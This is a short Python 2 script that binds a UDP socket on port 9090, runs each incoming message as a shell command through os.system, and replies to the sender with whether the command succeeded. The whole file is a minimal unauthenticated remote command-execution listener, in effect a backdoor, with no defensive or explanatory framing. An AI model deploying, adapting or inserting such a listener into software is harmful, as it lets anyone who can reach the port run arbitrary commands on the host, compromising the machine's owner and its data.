#!usr/bin/env python2
import os
import socket
ip="127.0.0.1"
port=9090
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)  # AF_INET is for ipv4 and SOCK_DGRAM is for UDP

# sending messahe to target
s.bind((ip,port)) #providing a way to connect
while True:	
	data=s.recvfrom(10)
#checking for commanf
	if os.system(data[0])==0:
		s.sendto(data[0]+": success",data[1])
	else :
		s.sendto(data[0]+": not found",data[1])	

